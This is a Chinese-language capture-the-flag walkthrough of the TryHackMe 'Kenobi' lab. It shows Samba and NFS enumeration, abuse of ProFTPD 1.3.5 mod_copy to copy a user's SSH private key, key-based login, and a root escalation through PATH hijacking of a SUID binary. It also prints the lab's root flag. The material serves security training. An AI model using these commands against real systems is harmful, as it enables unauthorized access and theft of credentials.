---
description: 本文相关内容：针对Linux目标机器，通过枚举Samba来获得网络共享信息，然后利用proftpd的版本漏洞，并通过Path变量来执行权限提升操作。
cover: ../../.gitbook/assets/2857591-20230613034651098-1864513283.png
coverY: 0
layout:
  cover:
    visible: true
    size: hero
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Kenobi-练习

TryHackMe实验房间链接：[https://tryhackme.com/room/kenobi](https://tryhackme.com/room/kenobi)

## 端口扫描

使用nmap扫描目标机：

```shell
nmap -sC -sV -A -T4 10.10.54.34
```

![image-20221012222510616](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221012222510616.png)

答题卡

![image-20221012222548631](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221012222548631.png)

## 枚举Samba共享

Samba是在Linux和UNIX系统上实现SMB协议的一个免费软件，由服务器及客户端程序构成。

在此之前我们已经了解了NFS，NFS与Samba一样，也是在网络中实现文件共享的一种实现，但不幸的是，NFS不支持windows平台，而本文要提到的Samba是能够在任何支持SMB协议的主机之间共享文件的一种实现，当然也包括windows主机。

SMB（Server Messages Block-服务器信息块）协议是一种在局域网上共享文件和打印机的一种通信协议，它为局域网内的不同计算机之间提供文件及打印机等资源的共享服务。SMB协议是C/S型协议，客户机通过该协议可以访问服务器上的共享文件系统、打印机及其他资源。

SMB协议有两个端口：139和445。

![image-20221012223709679](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221012223709679.png)

Samba监听端口有：TCP和UDP------tcp端口相对应的服务是smbd服务，其作用是提供对服务器中文件、打印资源的共享访问；udp端口相对应的服务是nmbd服务，其作用是提供基于NetBIOS主机名称的解析。

nmap有一个用于枚举SMB共享的脚本，使用 nmap，我们可以枚举一台机器的SMB 共享。

```shell
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.54.34
#也可以使用以下命令：smbclient -L \\\\10.10.54.34\\
```

![image-20221012225103752](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221012225103752.png)

使用smbclient命令，匿名连接目标机的SMB共享，查看共享系统上存在什么文件

```shell
smbclient //10.10.54.34/anonymous   #此ip为目标机的ip 不需要输入密码 按回车键即可
```

![image-20221012225249795](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221012225249795.png)

你可以使用smbget命令，通过匿名用户 递归地下载整个SMB 共享，共享系统中的文件将会被下载到本地

```shell
smbget -R smb://10.10.54.34/anonymous   #此ip为目标机的ip 不需要输入密码 按回车键即可
```

![image-20221012231711213](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221012231711213.png)

![image-20221012234100660](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221012234100660.png)

![image-20221012234738905](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221012234738905.png)

查看来自共享系统的log.txt文件内容，我们可以获取两个信息：

* 为Kenobi 用户生成 SSH 密钥时的信息（Kenobi用户的ssh密钥------保存在/home/kenobi/.ssh路径下 ）
* 有关 ProFTPD 服务器的信息（ 运行FTP服务的用户是 Kenobi）

之前的端口扫描显示了 端口111正在运行rpcbind服务，rpcbind是一个将远程程序调用(RPC-- remote procedure call)的程序号转换为通用地址的服务器。当一个RPC 服务启动时，它会告诉 rpcbind 它正在监听的地址以及它准备启用的服务所对应的RPC程序编号。

查看本例中端口111的nmap扫描信息，可以发现nfs（network file system）服务被远程启用，接下来尝试枚举nfs信息：

```shell
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.54.34  #此ip为目标机ip
```

![image-20221012231409160](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221012231409160.png)

答题卡

![image-20221012231457941](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221012231457941.png)

![image-20221012231535788](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221012231535788.png)

![image-20221012231545839](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221012231545839.png)

![image-20221012231554457](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221012231554457.png)

## 通过ProFtpd 获得初始访问权限

ProFtpd 是一个免费的开源 FTP 服务器，兼容 Unix 和 Windows 系统，这个软件的旧版本中存在漏洞。

由第一节的端口扫描结果可知，目标机上的ProFtpd 的版本是1.3.5，在攻击机上使用netcat连接目标机的ftp服务器也可以获取到ProFtpd的版本信息：

```shell
nc 10.10.54.34 21   #此处ip为目标机ip  目标机的ftp服务运行在21端口上
```

![image-20221012233012046](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221012233012046.png)

我们可以使用 searchsploit 查找特定软件版本的漏洞，searchsploit 是一个基于exple-db.com 的命令行搜索工具。

```shell
searchsploit proftpd 1.3.5
```

![image-20221012232648184](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221012232648184.png)

我们可以看到，该版本ProFtpd的mod\_copy模块中存在漏洞。（ mod\_copy模块功能-参考链接：http://www.proftpd.org/docs/contrib/mod\_copy.html ）

mod\_copy模块实现了SITE CPFR 和 SITE CPTO 命令(类似于 RNFR 和 RNTO) ，这些命令可以用来将文件/目录从服务器上的一个地方复制到另一个地方，而无需将数据传输到客户端并等待返回（无身份验证），该模块包含在 ProFTPD 1.3.x 的 mod\_copy.c 文件中，默认情况下不进行编译。

也就是说：任何未经身份验证的客户机都可以利用SITE CPFR 和 SITE CPTO 命令，将文件从FTP服务器的文件系统的任何位置复制到选定的位置。

由之前的信息我们知道：Kenobi是运行FTP服务的用户、Kenobi用户的ssh密钥保存路径。

现在我们将使用 SITE CPFR 和 SITE CPTO 命令复制Kenobi的ssh私钥，我们将私钥复制到NFS所挂载的目录下，后继我们就能获取到这个私钥文件：

```shell
#连接目标机的FTP服务器,FTP运行在21端口
nc 10.10.54.34 21
SITE CPFR /home/kenobi/.ssh/id_rsa
SITE CPTO /var/tmp/id_rsa  #将密钥复制到NFS所挂载的/var目录下
```

![image-20221013000820165](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221013000820165.png)

然后让我们将目标机的/var/tmp 目录挂载到我们的攻击机上：

```shell
mkdir /mnt/kenobiNFS
mount 10.10.54.34:/var /mnt/kenobiNFS   #此处的ip是目标机ip。完成挂载后：目标机的/var目录下的所有文件，都将在攻击机的/mnt/kenobiNFS目录下
ls -la /mnt/kenobiNFS
```

![image-20221013001424542](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221013001424542.png)

复制Kenobi的ssh私钥到攻击机当前目录，然后使用ssh登录到 Kenobi 的帐户，查看标志性文件：

```shell
cp /mnt/kenobiNFS/tmp/id_rsa .
chmod 600 id_rsa
ssh -i id_rsa kenobi@10.10.54.34 -oHostKeyAlgorithms=+ssh-rsa
```

![image-20221013001726378](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221013001726378.png)

答题卡

![image-20221012233110973](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221012233110973.png)

![image-20221012233119156](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221012233119156.png)

![image-20221013001815532](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221013001815532.png)

## 通过PATH变量提权

我们先了解SUID、SGID和SBIT(Sticky Bits)，这三个概念 我们在提权基础篇有详细讲解：

![image-20221013002023246](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221013002023246.png)

```
权限                        在文件上                                            在目录上
SUID Bit             用户使用文件所有者的权限执行文件	                              -
SGID Bit             用户在组所有者的权限下执行该文件                          在目录中创建的文件获取相同的组所有者。
Sticky Bit           无意义                                                阻止用户删除其他用户目录下的文件
```

SUID位是很不安全的，一些二进制文件确实需要提高权限来运行才被赋予SUID位(如/usr/bin/passwd，因为你需要使用它以便在系统上重置个人密码)，但是其他具有 SUID 位的自定义文件可能会导致各种各样的问题。

要在目标机系统中搜索SUID/SGID类型的文件，请在目标机上运行以下命令：

```shell
find / -perm -u=s -type f 2>/dev/null
```

![image-20221013003740031](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221013003740031.png)

找出看起来很不寻常的文件/usr/bin/menu ，并尝试执行它：

![image-20221013004132576](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221013004132576.png)

strings 是 Linux 上的一个命令，它能在二进制文件上查找人类可读的字符串，我们使用以下命令来查看/usr/bin/menu运行时的信息：

```shell
strings /usr/bin/menu 
```

![image-20221013005751357](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221013005751357.png)

观察上图可以得知：当我们执行/usr/bin/menu 时，选择选项二其实是在执行一个curl命令，选择选项二其实是在执行uname -r命令。

这表明二进制文件curl和uname，是在没有完整路径的情况下运行的(例如没有使用/usr/bin/curl 或/usr/bin/uname运行文件)。

我们已经知道/usr/bin/menu文件是一个SUID文件，它在执行时会暂时具有root 用户权限，我们可以尝试自定义创建一个curl文件（并写入/bin/bash，意思是打开一个bash shell），然后我们再给自定义的curl文件附加可执行权限（+x），接着将自定义的curl文件所在的路径添加到PATH变量中（这样能够保证我们自定义的curl文件能够被首先找到）。

完成以上操作之后，执行SUID文件/usr/bin/menu，产生的效果是：以root权限打开一个bash shell------获得root shell

```shell
cd /tmp
echo /bin/bash > curl 
chmod +x curl
export PATH=/tmp:$PATH   #新添加的路径/tmp会在PATH变量的最前面，这样就能用我们伪造的curl文件代替真实的curl文件，保证自定义的curl文件被成功执行
/usr/bin/menu            #在跳出选项时，我们选择选项一，这样就能调用到伪造的curl文件
ls /root/
cat /root/root.txt 
```

![image-20221013011316662](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221013011316662.png)

> 177b3cd8562289f37382721c28381f02

答题卡

![image-20221013011435636](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221013011435636.png)

![image-20221013011509953](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221013011509953.png)
